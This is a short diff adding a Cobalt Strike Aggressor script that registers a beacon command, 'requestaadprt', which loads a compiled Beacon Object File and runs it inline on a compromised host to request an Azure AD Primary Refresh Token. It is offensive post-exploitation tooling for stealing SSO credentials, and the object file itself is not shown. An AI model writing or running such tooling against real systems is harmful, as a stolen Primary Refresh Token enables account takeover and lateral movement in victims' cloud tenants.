@@ -1,0 +1,14 @@
+beacon_command_register(
+	"requestaadprt",
+	"Request a Primary Refresh Token for Azure SSO",
+	"");
+
+alias requestaadprt{
+    $bof_handle = openf(script_resource("request_aad_prt.x64.o"));
+    $bof_data = readb($bof_handle, -1);
+    closef($bof_handle);
+
+    btask($1, "Tasking beacon to request Azure PRT");
+    beacon_inline_execute($1, $bof_data, "go", $args);
+
+}
